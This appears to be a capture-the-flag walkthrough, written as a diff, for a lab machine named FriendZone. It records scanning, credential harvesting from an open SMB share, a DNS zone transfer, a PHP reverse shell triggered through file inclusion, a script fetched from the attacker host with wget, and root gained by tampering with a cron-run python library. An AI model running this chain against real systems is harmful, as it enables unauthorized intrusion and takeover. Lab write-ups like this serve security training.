@@ -1,0 +1,226 @@
+Machine-Name  : FriendZone
+IP-Address    : 10.129.190.140
+
+Command-Line: sudo nmap -p- -A -T4 10.129.190.140
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 18:28 EDT
+    Nmap scan report for 10.129.190.140
+    Host is up (0.051s latency).
+    Not shown: 65528 closed ports
+    PORT    STATE SERVICE     VERSION
+    21/tcp  open  ftp         vsftpd 3.0.3
+    22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+    |   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+    |_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+    53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+    | dns-nsid:
+    |_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+    80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+    |_http-server-header: Apache/2.4.29 (Ubuntu)
+    |_http-title: Friend Zone Escape software
+    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    443/tcp open  ssl/http    Apache httpd 2.4.29
+    |_http-server-header: Apache/2.4.29 (Ubuntu)
+    |_http-title: 404 Not Found
+    | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+    | Not valid before: 2018-10-05T21:02:30
+    |_Not valid after:  2018-11-04T21:02:30
+    |_ssl-date: TLS randomness does not represent time
+    | tls-alpn:
+    |_  http/1.1
+    445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=7/24%OT=21%CT=1%CU=39088%PV=Y%DS=2%DC=T%G=Y%TM=60FC943
+    OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)OPS(
+    OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+    OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+    OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+    OS:S)
+
+    Network Distance: 2 hops
+    Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Host script results:
+    |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
+    |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+    | smb-os-discovery:
+    |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+    |   Computer name: friendzone
+    |   NetBIOS computer name: FRIENDZONE\x00
+    |   Domain name: \x00
+    |   FQDN: friendzone
+    |_  System time: 2021-07-25T01:28:56+03:00
+    | smb-security-mode:
+    |   account_used: guest
+    |   authentication_level: user
+    |   challenge_response: supported
+    |_  message_signing: disabled (dangerous, but default)
+    | smb2-security-mode:
+    |   2.02:
+    |_    Message signing enabled but not required
+    | smb2-time:
+    |   date: 2021-07-24T22:28:56
+    |_  start_date: N/A
+
+    TRACEROUTE (using port 143/tcp)
+    HOP RTT      ADDRESS
+    1   51.81 ms 10.10.14.1
+    2   51.87 ms 10.129.190.140
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 59.47 seconds
+
+
+Notes: Notice SMB service running.
+
+Command-Line: smbget -H 10.129.190.140
+Result:
+    [+] Guest session       IP: 10.129.190.140:445  Name: 10.129.190.140
+            Disk                                                    Permissions     Comment
+            ----                                                    -----------     -------
+            print$                                                  NO ACCESS       Printer Drivers
+            Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
+            general                                                 READ ONLY       FriendZone Samba Server Files
+            Development                                             READ, WRITE     FriendZone Samba Server Files
+            IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
+
+Command-Line: mkdir smbmap/general
+Command-Line: smbget -a -R smb://10.129.190.140/general
+Result:
+    creds.txt
+
+Command-Line: cat creds.txt
+Result:
+    creds for the admin THING:
+    admin:WORKWORKHhallelujah@#
+
+Command-Line: mkdir smbget/Development
+Command-Line: smbget -a -R smb://10.129.190.140/Development
+Result:
+    NO FILES OR FOLDERS WERE DOWNLOADED.
+
+Notes: /general is a READ ONLY directory. Inside the folder, a password was found for user "admin". /Development is a READ/WRITE folder containing no documents.
+
+Notes: Attempted to login with the credentials through SSH.
+Result: FAILED.
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 50 -i 200,301,302,403 -u http://10.129.190.140
+Result:
+    [19:29:02] 301 -  320B  - /wordpress  ->  http://10.129.190.140/wordpress/
+
+Browser: http://10.129.190.140
+Notes: Found info@friendzoneportal.red
+Result:
+    friendzoneportal.red
+
+Notes: Performing zone transfer.
+
+Command-Line: dig axfr friendzone.red @10.129.190.140
+Result:
+    ; <<>> DiG 9.16.15-Debian <<>> axfr friendzone.red @10.129.190.140
+    ;; global options: +cmd
+    friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+    friendzone.red.         604800  IN      AAAA    ::1
+    friendzone.red.         604800  IN      NS      localhost.
+    friendzone.red.         604800  IN      A       127.0.0.1
+    administrator1.friendzone.red. 604800 IN A      127.0.0.1
+    hr.friendzone.red.      604800  IN      A       127.0.0.1
+    uploads.friendzone.red. 604800  IN      A       127.0.0.1
+    friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+    ;; Query time: 60 msec
+    ;; SERVER: 10.129.190.140#53(10.129.190.140)
+    ;; WHEN: Sat Jul 24 20:27:33 EDT 2021
+    ;; XFR size: 8 records (messages 1, bytes 289)
+
+Notes: Found "administrator1.friendzone.red", "hr.friendzone.red", and "uploads.friendzone.red". Added domain name to hosts.
+
+Browser: https://administrator1.friendzone.red
+Notes: Signed in with username "admin", and password "WORKWORKHhallelujah@#"
+Result: Successful login.
+    Login Done ! visit /dashboard.php
+
+Browser: https://administrator1.friendzone.red/dashboard.php
+Result:
+    Smart photo script for friendzone corp !
+    * Note : we are dealing with a beginner php developer and the application is not tested yet !
+
+    image_name param is missed !
+
+    please enter it to show the image
+
+    default is image_id=a.jpg&pagename=timestamp
+
+Command-Line:./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 50 -i 200,301,302,403 -u https://administrator1.friendzone.red/
+Result:
+    [18:25:28] 200 -    1KB - /images/
+    [18:25:28] 200 -    7B  - /login.php
+    [18:25:28] 403 -  311B  - /icons/
+    [18:25:41] 200 -  101B  - /dashboard.php
+    [18:26:54] 200 -   36B  - /timestamp.php
+
+Notes: Uploading php-reverse-shell.php to Development.
+Command-Line: cp /usr/share/laudanum/php/php-reverse-shell.php rev-shell.php
+Command-Line: smbclient -N \\\\10.129.190.140\\Development
+Command-Line: nc -lvnp 9001
+Browser: https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/rev-shell
+Result:
+    *** REVERSE SHELL ***
+    www-data@FriendZone:/$
+
+www-data@FriendZone:/home/friend$ cat user.txt
+Result: a9ed20acecd6c5b6b52f474e15ae9a11
+    *** USER OWNED ***
+
+www-data@FriendZone:/var/www$ cat mysql_data.conf
+Result:
+    for development process this is the mysql creds for user friend
+    db_user=friend
+    db_pass=Agpyu12!0.213$
+    *** USER ACCESS ***
+
+Notes: Found password for user "friend"
+
+Command-Line: cd HackingTools/LinEnum
+Command-Line: python3 -m http.server --bind 10.10.14.115 80
+www-data@FriendZone:/dev/shm$ wget http://10.10.14.115/LinEnum.sh -O LinEnum.sh
+www-data@FriendZone:/dev/shm$ chmod +x LinEnum.sh
+www-data@FriendZone:/dev/shm$ ./LinEnum.sh -t 1
+Result:
+    ./www-data/LinEnumResults.txt
+Notes: Found a file that is write-able with root privileges (os.py).
+    [-] Files not owned by user but writable by group:
+    -rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
+
+Notes: Going to overwrite the file and wait for the crontab to execute it. Taking code from ./os.py and appending it to /usr/lib/python2.7/os.py
+URL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
+Command-Line: nc -lvnp 9002
+Result:
+    listening on [any] 9002 ...
+    connect to [10.10.14.115] from (UNKNOWN) [10.129.190.140] 52442
+root@FriendZone:~# ls
+    ls
+    certs  ifupdown_0.8.17ubuntu1_amd64.deb  root.txt
+    *** ROOT ACCESS ***
+
+root@FriendZone:~# whoami
+Result:
+    root
+root@FriendZone:~# cd /root
+Result:
+root@FriendZone:~# ls
+Result:
+    certs  ifupdown_0.8.17ubuntu1_amd64.deb  root.txt
+root@FriendZone:~# cat root.txt
+Result:
+    b0e6c60b82cf96e9855ac1656a9e90c7
+    *** ROOT OWNED ***
+
+
+*** FINISHED ***
